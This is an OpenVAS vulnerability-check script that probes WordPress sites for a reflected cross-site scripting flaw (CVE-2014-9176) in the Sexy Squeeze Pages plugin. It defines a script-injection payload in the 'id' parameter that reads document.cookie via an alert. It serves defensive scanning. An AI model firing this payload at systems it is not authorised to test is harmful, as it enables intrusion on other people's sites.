###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_sexy_squeeze_pages_xss_vuln.nasl 11424 2018-09-17 08:03:52Z mmartin $
#
# Wordpress Sexy Squeeze Pages 'id' Parameter XSS Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805121");
  script_version("$Revision: 11424 $");
  script_cve_id("CVE-2014-9176");
  script_bugtraq_id(71511);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 10:03:52 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-01-09 13:32:41 +0530 (Fri, 09 Jan 2015)");
  script_name("Wordpress Sexy Squeeze Pages 'id' Parameter XSS Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wordpress
  Sexy Squeeze Pages and is prone to cross site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to the /instasqueeze/lp/index.php
  script does not validate input to the 'id' parameter before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser session
  in the context of an affected site.");

  script_tag(name:"affected", value:"Wordpress InstaSqueeze Sexy Squeeze
  Pages Plugin");

  script_tag(name:"solution", value:"No known solution was made available
  for at least one year since the disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129285");
  script_xref(name:"URL", value:"http://h4x0resec.blogspot.in/2014/11/wordpress-sexy-squeeze-pages-plugin.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-content/plugins/instasqueeze/lp/index.php?id='
          + '"><script>alert(document.cookie)</script>';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
  pattern:"<script>alert\(document\.cookie\)</script>",
  extra_check:"InstaSqueeze.com"))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port,data:report);
  exit(0);
}
